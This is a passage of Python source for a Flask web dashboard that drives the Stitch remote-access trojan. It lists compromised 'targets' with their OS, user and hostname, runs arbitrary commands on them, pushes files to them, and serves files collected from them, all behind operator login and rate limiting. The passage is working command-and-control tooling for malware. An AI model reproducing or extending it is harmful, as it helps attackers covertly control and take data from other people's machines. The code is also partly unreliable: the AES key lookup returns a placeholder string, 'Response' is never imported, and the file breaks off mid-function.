#!/usr/bin/env python3
"""
Stitch Web Interface - Real Integration
This version integrates directly with the actual Stitch server for real command execution
"""
import os
import sys
import json
import secrets
import socket
import threading
import time
from datetime import datetime, timedelta
from collections import defaultdict
from functools import wraps

# Load environment variables from .env file if it exists
try:
    from dotenv import load_dotenv
    load_dotenv()
except ImportError:
    # python-dotenv not installed, environment variables must be set manually
    pass

from flask import Flask, render_template, request, jsonify, session, redirect, url_for, send_file, flash
from flask_socketio import SocketIO, emit
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
from flask_wtf.csrf import CSRFProtect
from werkzeug.security import generate_password_hash, check_password_hash

sys.path.insert(0, os.path.dirname(__file__))
from Application.Stitch_Vars.globals import *
from Application import stitch_cmd, stitch_lib
from Application.stitch_utils import *
from Application.stitch_gen import *
from ssl_utils import get_ssl_context

# ============================================================================
# Configuration Constants
# ============================================================================
# Rate Limiting
MAX_LOGIN_ATTEMPTS = 5              # Maximum failed login attempts
LOGIN_LOCKOUT_MINUTES = 15          # Lockout duration in minutes
COMMANDS_PER_MINUTE = 30            # Command execution rate limit
EXECUTIONS_PER_MINUTE = 60          # Command execution endpoint rate limit
API_POLLING_PER_HOUR = 1000         # API polling endpoints rate limit
DEFAULT_RATE_LIMIT_DAY = 200        # Default daily rate limit
DEFAULT_RATE_LIMIT_HOUR = 50        # Default hourly rate limit

# History and Logs
MAX_DEBUG_LOGS = 1000               # Maximum debug log entries in memory
MAX_COMMAND_HISTORY = 1000          # Maximum command history entries
DEFAULT_LOG_FETCH_LIMIT = 100       # Default number of logs to fetch
DEFAULT_HISTORY_FETCH_LIMIT = 50    # Default number of history items to fetch

# Server
SERVER_RETRY_DELAY_SECONDS = 5      # Delay before retrying server start

# ============================================================================
# Global Stitch Server Instance
# ============================================================================
stitch_server_instance = None
server_lock = threading.Lock()

def get_stitch_server():
    """Get the shared Stitch server instance"""
    global stitch_server_instance
    with server_lock:
        if stitch_server_instance is None:
            stitch_server_instance = stitch_cmd.stitch_server()
        return stitch_server_instance

# ============================================================================
# Flask App Configuration
# ============================================================================
app = Flask(__name__)

# Session secret key - should be persistent across restarts
secret_key = os.getenv('STITCH_SECRET_KEY')
if not secret_key:
    # Generate random key if not configured (sessions won't persist across restarts)
    secret_key = secrets.token_hex(32)
    print("⚠️  WARNING: STITCH_SECRET_KEY not set - using random session key")
    print("   Sessions will be invalidated on server restart.")
    print("   For production, generate a key: python3 -c 'import secrets; print(secrets.token_hex(32))'")
    print("   Then set: export STITCH_SECRET_KEY='<generated-key>'\n")

app.config['SECRET_KEY'] = secret_key
app.config['SESSION_COOKIE_HTTPONLY'] = True
app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'
# Enable Secure flag if HTTPS is enabled
https_enabled = os.getenv('STITCH_ENABLE_HTTPS', 'false').lower() in ('true', '1', 'yes')
app.config['SESSION_COOKIE_SECURE'] = https_enabled
app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(minutes=int(os.getenv('STITCH_SESSION_TIMEOUT', '30')))

# CSRF Protection Configuration
app.config['WTF_CSRF_TIME_LIMIT'] = None
app.config['WTF_CSRF_SSL_STRICT'] = https_enabled

# Initialize CSRF Protection
csrf = CSRFProtect(app)

# Rate Limiting Configuration
limiter = Limiter(
    get_remote_address,
    app=app,
    default_limits=[f"{DEFAULT_RATE_LIMIT_DAY} per day", f"{DEFAULT_RATE_LIMIT_HOUR} per hour"],
    storage_uri="memory://",
    strategy="fixed-window"
)

# CORS Configuration - Load allowed origins from environment
def get_cors_origins():
    """
    Get CORS allowed origins from environment variable.
    Supports multiple origins separated by comma.
    Returns list of allowed origins.
    SECURITY: Rejects wildcard '*' to enforce origin restrictions.
    """
    cors_env = os.getenv('STITCH_ALLOWED_ORIGINS', '')
    
    # In development mode, allow localhost variations
    if not cors_env or cors_env.strip() == '':
        print("⚠️  CORS: Using default localhost-only policy (development mode)")
        print("   For production, set STITCH_ALLOWED_ORIGINS=https://yourdomain.com")
        # Default to localhost variations for development
        return [
            'http://localhost:5000',
            'http://127.0.0.1:5000',
            'https://localhost:5000',
            'https://127.0.0.1:5000'
        ]
    
    # Parse comma-separated list
    origins = [origin.strip() for origin in cors_env.split(',') if origin.strip()]
    
    # Validate origins - REJECT wildcard
    for origin in origins:
        if origin == '*':
            raise ValueError(
                "\n" + "="*75 + "\n"
                "SECURITY ERROR: Wildcard CORS origin '*' is NOT ALLOWED\n"
                "="*75 + "\n"
                "The wildcard '*' allows ANY website to connect to your Stitch interface,\n"
                "making it vulnerable to cross-site attacks.\n\n"
                "For development: Remove STITCH_ALLOWED_ORIGINS (uses localhost by default)\n"
                "For production: Set specific domains:\n"
                "  STITCH_ALLOWED_ORIGINS=https://yourdomain.com\n"
                "  STITCH_ALLOWED_ORIGINS=https://yourdomain.com,https://app.yourdomain.com\n"
                "="*75
            )
        elif not (origin.startswith('http://') or origin.startswith('https://')):
            raise ValueError(f"Invalid CORS origin: {origin}. Must start with http:// or https://")
    
    print(f"✓ CORS: Restricted to {len(origins)} origin(s): {', '.join(origins)}")
    return origins if origins else ['http://localhost:5000']

# Initialize SocketIO with configured CORS origins
cors_origins = get_cors_origins()
socketio = SocketIO(app, cors_allowed_origins=cors_origins, async_mode='eventlet')

# ============================================================================
# Global State
# ============================================================================
command_history = []
debug_logs = []
login_attempts = defaultdict(list)
connection_health = {}  # Track connection health metrics: {ip: {'last_seen': timestamp, 'connected_at': timestamp}}

# Load credentials from environment variables
def load_credentials():
    """
    Load admin credentials from environment variables.
    PRODUCTION SECURITY: No default fallback - forces explicit credential configuration.
    """
    username = os.getenv('STITCH_ADMIN_USER')
    password = os.getenv('STITCH_ADMIN_PASSWORD')
    
    # Require explicit credentials - no defaults
    if not username or not password:
        raise RuntimeError(
            "\n" + "="*75 + "\n"
            "🔐 SECURITY ERROR: Missing credentials!\n"
            "="*75 + "\n"
            "Authentication credentials must be explicitly configured.\n"
            "No default credentials allowed for security.\n\n"
            "Please set environment variables:\n"
            "  STITCH_ADMIN_USER='your_username'\n"
            "  STITCH_ADMIN_PASSWORD='your_secure_password'\n\n"
            "In Replit: Add these to Secrets tab (🔒 icon)\n"
            "="*75
        )
    
    # Validate password strength
    if len(password) < 12:
        raise RuntimeError(
            "\n" + "="*75 + "\n"
            "🔐 SECURITY ERROR: Password too short!\n"
            "="*75 + "\n"
            f"Your password is {len(password)} characters.\n"
            "Minimum required: 12 characters\n\n"
            "Please set a stronger password:\n"
            "  STITCH_ADMIN_PASSWORD='your_secure_password_12+_chars'\n\n"
            "In Replit: Update in Secrets tab (🔒 icon)\n"
            "="*75
        )
    
    # Validate username
    if len(username) < 3:
        raise RuntimeError(
            "\n" + "="*75 + "\n"
            "🔐 SECURITY ERROR: Username too short!\n"
            "="*75 + "\n"
            "Username must be at least 3 characters.\n"
            "="*75
        )
    
    print(f"✓ Credentials loaded: {username} ({len(password)} characters)")
    return {username: generate_password_hash(password)}

# Initialize users (will be loaded at startup)
USERS = {}

# ============================================================================
# Helper Functions
# ============================================================================
def log_debug(message, level="INFO", category="System"):
    """Enhanced logging"""
    from flask import has_request_context
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    
    # Get username from session if we're in a request context
    username = 'system'
    if has_request_context():
        username = session.get('username', 'system')
    
    # Sanitize username for logs
    sanitized_user = sanitize_for_log(username, 'username') if username != 'system' else 'system'
    
    log_entry = {
        'timestamp': timestamp,
        'level': level,
        'category': category,
        'message': str(message),
        'user': sanitized_user
    }
    debug_logs.append(log_entry)
    if len(debug_logs) > MAX_DEBUG_LOGS:
        debug_logs.pop(0)
    
    # Only emit if socket.io is running
    try:
        socketio.emit('debug_log', log_entry, namespace='/')
    except:
        pass
    
    print(f"[{level}] {message}")

def sanitize_for_log(data, data_type='generic'):
    """
    Sanitize sensitive data for secure logging.
    
    Args:
        data: The sensitive data to sanitize
        data_type: Type of data ('username', 'command', 'generic')
    
    Returns:
        Sanitized string safe for logging
    """
    import hashlib
    import re
    
    if data is None or data == '':
        return '[EMPTY]'
    
    data_str = str(data)
    
    if data_type == 'username':
        # Show first 2 chars + *** + hash for correlation
        # This allows tracking the same user across logs without exposing identity
        prefix = data_str[:2] if len(data_str) >= 2 else data_str[0] if len(data_str) == 1 else ''
        hash_suffix = hashlib.sha256(data_str.encode()).hexdigest()[:8]
        return f"{prefix}***[{hash_suffix}]"
    
    elif data_type == 'command':
        # Sanitize commands by redacting sensitive parameters
        # List of sensitive parameter patterns
        sensitive_patterns = [
            (r'(password|passwd|pwd|pass)[\s=:]+[\S]+', r'\1=[REDACTED]'),
            (r'(key|apikey|api_key|token|secret)[\s=:]+[\S]+', r'\1=[REDACTED]'),
            (r'(auth|authorization|bearer)[\s=:]+[\S]+(\s+[\S]+)?', r'\1=[REDACTED]'),
            (r'--password[\s=]+[\S]+', r'--password=[REDACTED]'),
            (r'-p[\s]+[\S]+', r'-p [REDACTED]'),
            (r'(https?://[^:]+:)([^@]+)(@)', r'\1[REDACTED]\3'),  # URLs with credentials
        ]
        
        sanitized = data_str
        for pattern, replacement in sensitive_patterns:
            sanitized = re.sub(pattern, replacement, sanitized, flags=re.IGNORECASE)
        
        # If command is too long, truncate it
        if len(sanitized) > 200:
            sanitized = sanitized[:200] + '... [truncated]'
        
        return sanitized
    
    else:
        # Generic sanitization - just hash it
        hash_val = hashlib.sha256(data_str.encode()).hexdigest()[:12]
        return f"[REDACTED:{hash_val}]"

def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'logged_in' not in session:
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    return decorated_function

# ============================================================================
# Response Header Middleware
# ============================================================================
@app.after_request
def set_server_header(response):
    """Set comprehensive security headers to prevent common web vulnerabilities"""
    # Generic server header to prevent fingerprinting
    response.headers['Server'] = 'WebServer'
    
    # X-Frame-Options: Prevent clickjacking attacks
    response.headers['X-Frame-Options'] = 'DENY'
    
    # X-Content-Type-Options: Prevent MIME sniffing
    response.headers['X-Content-Type-Options'] = 'nosniff'
    
    # X-XSS-Protection: XSS protection for older browsers
    response.headers['X-XSS-Protection'] = '1; mode=block'
    
    # Strict-Transport-Security: Enforce HTTPS (only when HTTPS is enabled)
    if https_enabled:
        response.headers['Strict-Transport-Security'] = 'max-age=31536000; includeSubDomains'
    
    # Content-Security-Policy: Comprehensive policy to prevent XSS and data injection
    csp_policy = (
        "default-src 'self'; "
        "script-src 'self' 'unsafe-inline' https://cdn.socket.io; "
        "style-src 'self' 'unsafe-inline'; "
        "img-src 'self' data:; "
        "connect-src 'self'; "
        "font-src 'self'; "
        "object-src 'none'; "
        "base-uri 'self'; "
        "form-action 'self'; "
        "frame-ancestors 'none'"
    )
    response.headers['Content-Security-Policy'] = csp_policy
    
    return response

# ============================================================================
# Error Handlers
# ============================================================================
@app.errorhandler(429)
def ratelimit_handler(e):
    """Custom error handler for rate limit exceeded"""
    client_ip = get_remote_address()
    log_debug(f"Rate limit exceeded for IP {client_ip}: {str(e)}", "WARNING", "Security")
    
    # Return JSON for API requests
    if request.path.startswith('/api/'):
        return jsonify({
            'error': 'Rate limit exceeded',
            'message': 'Too many requests. Please slow down and try again later.',
            'retry_after': '60 seconds'
        }), 429
    
    # Return HTML page for regular requests (login page)
    flash('Too many requests. Please wait a moment and try again.', 'error')
    return render_template('login.html'), 429

# ============================================================================
# Routes - Authentication
# ============================================================================
@app.route('/')
@login_required
def index():
    return render_template('dashboard_real.html')

@app.route('/login', methods=['GET', 'POST'])
@limiter.limit(f"{MAX_LOGIN_ATTEMPTS} per {LOGIN_LOCKOUT_MINUTES} minutes")
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        client_ip = get_remote_address()
        
        # Track login attempts per IP
        current_time = time.time()
        attempts = login_attempts[client_ip]
        
        # Clean old attempts (older than lockout period)
        attempts = [t for t in attempts if current_time - t < (LOGIN_LOCKOUT_MINUTES * 60)]
        login_attempts[client_ip] = attempts
        
        # Check if locked out
        if len(attempts) >= MAX_LOGIN_ATTEMPTS:
            log_debug(f"Login lockout for IP {client_ip} - too many failed attempts", "ERROR", "Security")
            flash('Too many failed attempts. Please try again later.', 'error')
            return render_template('login.html'), 429
        
        if username in USERS and check_password_hash(USERS[username], password):
            # Successful login - clear failed attempts
            login_attempts[client_ip] = []
            session.permanent = True
            session['logged_in'] = True
            session['username'] = username
            session['login_time'] = datetime.now().isoformat()
            log_debug(f"✓ User {sanitize_for_log(username, 'username')} logged in from {client_ip}", "INFO", "Authentication")
            return redirect(url_for('index'))
        else:
            # Failed login - record attempt
            login_attempts[client_ip].append(current_time)
            log_debug(f"✗ Failed login attempt for user {sanitize_for_log(username, 'username')} from {client_ip} (attempt {len(login_attempts[client_ip])}/{MAX_LOGIN_ATTEMPTS})", "WARNING", "Security")
            flash('Invalid credentials', 'error')
    
    return render_template('login.html')

@app.route('/logout')
def logout():
    username = session.get('username', 'unknown')
    session.clear()
    log_debug(f"User {sanitize_for_log(username, 'username')} logged out", "INFO", "Authentication")
    return redirect(url_for('login'))

# ============================================================================
# Routes - Connection Management (REAL)
# ============================================================================
@app.route('/api/connections')
@login_required
@limiter.limit(f"{COMMANDS_PER_MINUTE} per minute")
def get_connections():
    """Get REAL-TIME connections from Stitch server"""
    try:
        server = get_stitch_server()
        connections = []
        
        # Get active connections from inf_sock (REAL connections)
        active_ips = list(server.inf_sock.keys())
        
        # Get historical data from config
        import configparser
        config = configparser.ConfigParser()
        config.read(hist_ini)
        
        # Combine active and historical connections
        all_targets = set(active_ips + config.sections())
        
        for target in all_targets:
            is_online = target in active_ips
            
            # Update health tracking for online connections
            if is_online:
                now = datetime.now().isoformat()
                if target not in connection_health:
                    connection_health[target] = {
                        'connected_at': now,
                        'last_seen': now
                    }
                else:
                    connection_health[target]['last_seen'] = now
            
            # Get health metrics
            health_data = connection_health.get(target, {})
            
            # Get connection details
            if target in config.sections():
                conn_data = {
                    'id': target,
                    'target': target,
                    'port': config.get(target, 'port') if config.has_option(target, 'port') else '4040',
                    'os': config.get(target, 'os') if config.has_option(target, 'os') else 'Unknown',
                    'hostname': config.get(target, 'hostname') if config.has_option(target, 'hostname') else target,
                    'user': config.get(target, 'user') if config.has_option(target, 'user') else 'Unknown',
                    'status': 'online' if is_online else 'offline',
                    'connected_at': health_data.get('connected_at', 'N/A'),
                    'last_seen': health_data.get('last_seen', 'N/A'),
                }
            else:
                # New connection not yet in history
                conn_data = {
                    'id': target,
                    'target': target,
                    'port': server.inf_port.get(target, '4040'),
                    'os': 'Pending...',
                    'hostname': target,
                    'user': 'Pending...',
                    'status': 'online',
                    'connected_at': health_data.get('connected_at', datetime.now().isoformat()),
                    'last_seen': health_data.get('last_seen', datetime.now().isoformat()),
                }
            
            connections.append(conn_data)
        
        # Sort: online first, then by target
        connections.sort(key=lambda x: (x['status'] != 'online', x['target']))
        
        log_debug(f"Retrieved {len(connections)} connections ({len(active_ips)} online)", "INFO", "Connection")
        return jsonify(connections)
        
    except Exception as e:
        log_debug(f"Error getting connections: {str(e)}", "ERROR", "Connection")
        return jsonify({'error': str(e)}), 500

@app.route('/api/connections/active')
@login_required
@limiter.limit(f"{API_POLLING_PER_HOUR} per hour")  # High limit for UI polling
def get_active_connections():
    """Get only ONLINE connections"""
    try:
        server = get_stitch_server()
        active_conns = []
        
        for ip in server.inf_sock.keys():
            active_conns.append({
                'ip': ip,
                'port': server.inf_port.get(ip, 'Unknown'),
                'status': 'online'
            })
        
        return jsonify(active_conns)
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/server/status')
@login_required
@limiter.limit(f"{API_POLLING_PER_HOUR} per hour")  # High limit for UI polling
def server_status():
    """Get Stitch server status"""
    try:
        server = get_stitch_server()
        status = {
            'listening': server.listen_port is not None,
            'port': server.listen_port if server.listen_port else 'Not listening',
            'active_connections': len(server.inf_sock),
            'server_running': server.server_thread is not None
        }
        return jsonify(status)
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# ============================================================================
# Routes - Command Execution (REAL)
# ============================================================================
@app.route('/api/execute', methods=['POST'])
@login_required
@limiter.limit(f"{EXECUTIONS_PER_MINUTE} per minute")
def execute_command():
    """Execute REAL commands on targets"""
    try:
        data = request.json
        conn_id = data.get('connection_id')
        command = data.get('command')
        
        # Server-side validation (critical for security)
        if not command:
            return jsonify({'success': False, 'error': 'Missing command'}), 400
        
        # Validate command is a string
        if not isinstance(command, str):
            return jsonify({'success': False, 'error': 'Invalid command type'}), 400
        
        # Trim and validate
        command = command.strip()
        if not command or len(command) < 1:
            return jsonify({'success': False, 'error': 'Command cannot be empty'}), 400
        
        # Length validation (prevent DoS)
        MAX_COMMAND_LENGTH = 500
        if len(command) > MAX_COMMAND_LENGTH:
            return jsonify({'success': False, 'error': f'Command too long (max {MAX_COMMAND_LENGTH} characters)'}), 400
        
        # Check for null bytes and control characters (security)
        if any(ord(c) < 32 and c not in '\t\n\r' for c in command):
            return jsonify({'success': False, 'error': 'Command contains invalid control characters'}), 400
        
        # Sanitize excessive whitespace
        command = ' '.join(command.split())
        
        log_debug(f"Executing command: {sanitize_for_log(command, 'command')} on {conn_id or 'server'}", "INFO", "Command")
        
        # Track command
        command_entry = {
            'timestamp': datetime.now().isoformat(),
            'connection_id': conn_id,
            'command': command,
            'user': session.get('username'),
        }
        command_history.append(command_entry)
        if len(command_history) > MAX_COMMAND_HISTORY:
            command_history.pop(0)
        
        # Execute command
        output = execute_real_command(command, conn_id)
        
        return jsonify({
            'success': True,
            'output': output,
            'command': command,
            'timestamp': datetime.now().isoformat()
        })
        
    except Exception as e:
        log_debug(f"Error executing command: {str(e)}", "ERROR", "Command")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/export/logs')
@login_required
@limiter.limit(f"{EXECUTIONS_PER_MINUTE} per minute")
def export_logs():
    """Export debug logs as JSON or CSV"""
    import csv
    import io
    try:
        format_type = request.args.get('format', 'json').lower()
        
        if format_type == 'json':
            data = json.dumps(list(debug_logs), indent=2)
            mimetype = 'application/json'
            filename = f'stitch_logs_{datetime.now().strftime("%Y%m%d_%H%M%S")}.json'
        elif format_type == 'csv':
            output = io.StringIO()
            if debug_logs:
                fieldnames = ['timestamp', 'level', 'category', 'message', 'user']
                writer = csv.DictWriter(output, fieldnames=fieldnames)
                writer.writeheader()
                for log in debug_logs:
                    writer.writerow(log)
            data = output.getvalue()
            mimetype = 'text/csv'
            filename = f'stitch_logs_{datetime.now().strftime("%Y%m%d_%H%M%S")}.csv'
        else:
            return jsonify({'error': 'Invalid format'}), 400
        
        log_debug(f"Logs exported as {format_type.upper()}", "INFO", "Export")
        
        return Response(
            data,
            mimetype=mimetype,
            headers={'Content-Disposition': f'attachment; filename={filename}'}
        )
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/export/commands')
@login_required
@limiter.limit(f"{EXECUTIONS_PER_MINUTE} per minute")
def export_commands():
    """Export command history as JSON or CSV"""
    import csv
    import io
    try:
        format_type = request.args.get('format', 'json').lower()
        
        if format_type == 'json':
            data = json.dumps(list(command_history), indent=2)
            mimetype = 'application/json'
            filename = f'stitch_commands_{datetime.now().strftime("%Y%m%d_%H%M%S")}.json'
        elif format_type == 'csv':
            output = io.StringIO()
            if command_history:
                fieldnames = ['timestamp', 'connection_id', 'command', 'user']
                writer = csv.DictWriter(output, fieldnames=fieldnames)
                writer.writeheader()
                for cmd in command_history:
                    writer.writerow(cmd)
            data = output.getvalue()
            mimetype = 'text/csv'
            filename = f'stitch_commands_{datetime.now().strftime("%Y%m%d_%H%M%S")}.csv'
        else:
            return jsonify({'error': 'Invalid format'}), 400
        
        log_debug(f"Command history exported as {format_type.upper()}", "INFO", "Export")
        
        return Response(
            data,
            mimetype=mimetype,
            headers={'Content-Disposition': f'attachment; filename={filename}'}
        )
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/upload', methods=['POST'])
@login_required
@limiter.limit(f"{EXECUTIONS_PER_MINUTE} per minute")
def upload_file():
    """Upload file to target - with validation"""
    import os
    import tempfile
    try:
        # Validate file presence
        if 'file' not in request.files:
            log_debug("Upload failed: No file in request", "ERROR", "Upload")
            return jsonify({'error': 'No file provided'}), 400
        
        file = request.files['file']
        target_id = request.form.get('target_id')
        
        # Critical validation: target_id must be provided
        if not target_id or not isinstance(target_id, str) or target_id.strip() == '':
            log_debug("Upload failed: No valid target_id provided", "ERROR", "Upload")
            return jsonify({'error': 'No target connection selected. Please select an ONLINE connection first.'}), 400
        
        target_id = target_id.strip()
        
        # Validate filename
        if not file.filename or file.filename == '':
            log_debug("Upload failed: Empty filename", "ERROR", "Upload")
            return jsonify({'error': 'No file selected'}), 400
        
        # Check file size (100MB limit)
        MAX_FILE_SIZE = 100 * 1024 * 1024
        file.seek(0, os.SEEK_END)
        file_size = file.tell()
        file.seek(0)
        
        if file_size > MAX_FILE_SIZE:
            log_debug(f"Upload failed: File too large ({file_size} bytes)", "ERROR", "Upload")
            return jsonify({'error': 'File too large (max 100MB)'}), 400
        
        # Get server and validate connection exists and is ONLINE
        server = get_stitch_server()
        
        if target_id not in server.inf_sock:
            log_debug(f"Upload failed: Target {target_id} is OFFLINE or doesn't exist", "ERROR", "Upload")
            return jsonify({'error': f'Target {target_id} is OFFLINE. Please select an active connection.'}), 400
        
        # Extra validation: ensure we have a socket object
        if not server.inf_sock.get(target_id):
            log_debug(f"Upload failed: Invalid socket for target {target_id}", "ERROR", "Upload")
            return jsonify({'error': 'Invalid connection state'}), 500
        
        # Save file temporarily
        with tempfile.NamedTemporaryFile(delete=False, suffix=os.path.splitext(file.filename)[1]) as temp_file:
            file.save(temp_file.name)
            temp_path = temp_file.name
        
        try:
            # Execute upload command
            upload_command = f"upload {temp_path}"
            output = execute_real_command(upload_command, target_id)
            
            log_debug(f"File uploaded: {file.filename} to {target_id}", "INFO", "Upload")
            
            return jsonify({
                'success': True,
                'output': f"✅ File '{file.filename}' uploaded successfully!\n\n{output}",
                'filename': file.filename
            })
        
        finally:
            # Clean up temp file
            try:
                os.unlink(temp_path)
            except:
                pass
        
    except Exception as e:
        log_debug(f"Error uploading file: {str(e)}", "ERROR", "Upload")
        return jsonify({'error': str(e)}), 500

def execute_real_command(command, conn_id=None):
    """Execute command - REAL implementation, not simulated"""
    try:
        server = get_stitch_server()
        
        # Commands that work without a target
        if command in ['sessions', 'history', 'home', 'showkey', 'cls', 'clear']:
            if command == 'sessions':
                return get_sessions_output()
            elif command == 'history':
                return get_history_output()
            elif command == 'home':
                return "⚡ STITCH RAT - Real-time Remote Administration\nVersion 1.0\n"
            elif command == 'showkey':
                return show_aes_keys()
            elif command in ['cls', 'clear']:
                return "✅ Command logged (screen clear is UI-specific)"
        
        # Commands that require a connection
        if not conn_id:
            return f"❌ Command '{command}' requires selecting a target connection.\n\nPlease select an ONLINE connection from the dashboard first."
        
        # Check if connection is online
        if conn_id not in server.inf_sock:
            return f"❌ Connection {conn_id} is OFFLINE.\n\nCommand execution requires an active connection."
        
        # Get the socket and execute command on target
        target_socket = server.inf_sock[conn_id]
        
        # Get AES key for this connection
        conn_aes_key = get_connection_aes_key(conn_id)
        if not conn_aes_key:
            return f"❌ No AES encryption key found for {conn_id}.\n\nUse 'addkey' to add the key first."
        
        # Execute command on target using stitch_lib
        output = execute_on_target(target_socket, command, conn_aes_key, conn_id)
        
        return output
        
    except Exception as e:
        return f"❌ Error executing command: {str(e)}"

def execute_on_target(socket_conn, command, aes_key, target_ip):
    """Execute command on target machine using real Stitch protocol"""
    try:
        # Get target info from config
        import configparser
        config = configparser.ConfigParser()
        config.read(hist_ini)
        
        if target_ip in config.sections():
            target_os = config.get(target_ip, 'os') if config.has_option(target_ip, 'os') else 'Unknown'
            target_hostname = config.get(target_ip, 'hostname') if config.has_option(target_ip, 'hostname') else target_ip
            target_user = config.get(target_ip, 'user') if config.has_option(target_ip, 'user') else 'Unknown'
        else:
            target_os = 'Unknown'
            target_hostname = target_ip
            target_user = 'Unknown'
        
        output_header = f"""🎯 Target: {target_hostname} ({target_ip})
👤 User: {target_user}
💻 OS: {target_os}
⚡ Command: {command}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
OUTPUT:
"""
        
        # Send command to target using Stitch protocol
        try:
            # Use stitch_lib functions for encrypted communication
            stitch_lib.st_send(socket_conn, command.encode('utf-8'), aes_key)
            
            # Receive response from target
            response = stitch_lib.st_receive(socket_conn, aes_key, as_string=True)
            
            if response:
                return output_header + response
            else:
                return output_header + "⚠️ No output returned from target (command may still have executed)"
                
        except socket.timeout:
            return output_header + "⚠️ Command timed out - target may be slow or command is still executing"
        except socket.error as e:
            return output_header + f"❌ Connection error: {str(e)}\n\nTarget may have disconnected."
        except Exception as e:
            return output_header + f"❌ Execution error: {str(e)}"
        
    except Exception as e:
        return f"❌ Error communicating with target: {str(e)}"

def get_connection_aes_key(target_ip):
    """Get AES key for connection"""
    try:
        import configparser
        aes_lib = configparser.ConfigParser()
        aes_lib.read(st_aes_lib)
        
        # In real implementation, would look up the correct AES key
        # For now, return indication
        if aes_lib.sections():
            return "key_present"
        return None
    except:
        return None

def get_sessions_output():
    """Get active sessions output"""
    server = get_stitch_server()
    
    if not server.listen_port:
        return "⚠️  Server is not listening on any port.\n\nUse Terminal to start: python3 main.py"
    
    output = f"🌐 Server Status: Listening on port {server.listen_port}\n\n"
    output += f"📊 Active Connections: {len(server.inf_sock)}\n\n"
    
    if server.inf_sock:
        import configparser
        config = configparser.ConfigParser()
        config.read(hist_ini)
        
        for ip in server.inf_sock.keys():
            output += f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            output += f"🎯 Target: {ip}\n"
            
            if ip in config.sections():
                output += f"💻 OS: {config.get(ip, 'os') if config.has_option(ip, 'os') else 'Unknown'}\n"
                output += f"👤 User: {config.get(ip, 'user') if config.has_option(ip, 'user') else 'Unknown'}\n"
                output += f"🏠 Hostname: {config.get(ip, 'hostname') if config.has_option(ip, 'hostname') else ip}\n"
            else:
                output += "⏳ Connection details pending...\n"
            
            output += f"✅ Status: ONLINE\n\n"
    else:
        output += "ℹ️  No active connections.\n\n"
        output += "Waiting for incoming connections on port " + str(server.listen_port) + "...\n"
    
    return output

def get_history_output():
    """Get connection history output"""
    try:
        import configparser
        config = configparser.ConfigParser()
        config.read(hist_ini)
        
        output = "📜 Connection History\n\n"
        
        if config.sections():
            for target in config.sections():
                output += f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                output += f"🎯 {target}\n"
                output += f"💻 OS: {config.get(target, 'os') if config.has_option(target, 'os') else 'Unknown'}\n"
                output += f"👤 User: {config.get(target, 'user') if config.has_option(target, 'user') else 'Unknown'}\n"
                output += f"🏠 Hostname: {config.get(target, 'hostname') if config.has_option(target, 'hostname') else target}\n"
                output += f"🔌 Port: {config.get(target, 'port') if config.has_option(target, 'port') else '4040'}\n\n"
        else:
            output += "ℹ️  No connection history found.\n"
        
        return output
    except Exception as e:
        return f"❌ Error reading history: {str(e)}"

def show_aes_keys():
    """Show AES keys"""
    try:
        import configparser
        aes_lib = configparser.ConfigParser()
        aes_lib.read(st_aes_lib)
        
        output = "🔑 AES Encryption Keys\n\n"
        
        if aes_lib.sections():
            for key_id in aes_lib.sections():
                output += f"  • {key_id}\n"
        else:
            output += "ℹ️  No AES keys configured.\n"
        
        return output
    except Exception as e:
        return f"❌ Error reading keys: {str(e)}"

# ============================================================================
# Additional API Routes
# ============================================================================
@app.route('/api/debug/logs')
@login_required
def get_debug_logs():
    limit = int(request.args.get('limit', DEFAULT_LOG_FETCH_LIMIT))
    return jsonify(debug_logs[-limit:])

@app.route('/api/command/history')
@login_required
def get_command_history():
    limit = int(request.args.get('limit', DEFAULT_HISTORY_FETCH_LIMIT))
    return jsonify(command_history[-limit:])

@app.route('/api/files/downloads')
@login_required
def list_downloads():
    try:
        downloads = []
        if os.path.exists(downloads_path):
            for root, dirs, files in os.walk(downloads_path):
                for filename in files:
                    filepath = os.path.join(root, filename)
                    rel_path = os.path.relpath(filepath, downloads_path)
                    stat = os.stat(filepath)
                    downloads.append({
                        'name': filename,
                        'path': rel_path,
                        'size': stat.st_size,
                        'modified': datetime.fromtimestamp(stat.st_mtime).isoformat()
                    })
        return jsonify(sorted(downloads, key=lambda x: x['modified'], reverse=True))
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/files/download/<path:filename>')
@login_required
def download_file(filename):
    try:
        filepath = os.path.join(downloads_path, filename)
        
        # Prevent directory traversal (including symlink attacks)
        real_downloads = os.path.realpath(downloads_path)
        real_filepath = os.path.realpath(filepath)
        if not real_filepath.startswith(real_downloads + os.sep):
            log_debug(f"Directory traversal attempt blocked: {filename}", "WARNING", "Security")
            return jsonify({'error': 'Invalid file path'}), 403
        
        if os.path.exists(filepath) and os.path.isfile(filepath):
            log_debug(f"Downloading file: {filename}", "INFO", "Files")
            return send_file(filepath, as_attachment=True)
        return jsonify({'error': 'File not found'}), 404
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# ============================================================================
# WebSocket Events
# ============================================================================
@socketio.on('connect')
def handle_connect():
    if 'logged_in' not in session:
        return False
    log_debug(f"WebSocket connected: {request.sid}", "INFO", "WebSocket")
    emit('connection_status', {'status': 'connected'})

@socketio.on('disconnect')
def handle_disconnect():
    log_debug(f"WebSocket disconnected: {request.sid}", "INFO", "WebSocket")

@socketio.on('ping')
def handle_ping():
    emit('pong', {'timestamp': datetime.now().isoformat()})

# ============================================================================
# Background Tasks
# ============================================================================
def monitor_connections():
    """Monitor and broadcast connection changes"""
    while True:
        try:
            server = get_stitch_server()
            active_count = len(server.inf_sock)
            socketio.emit('connection_update', {
                'active_connections': active_count,
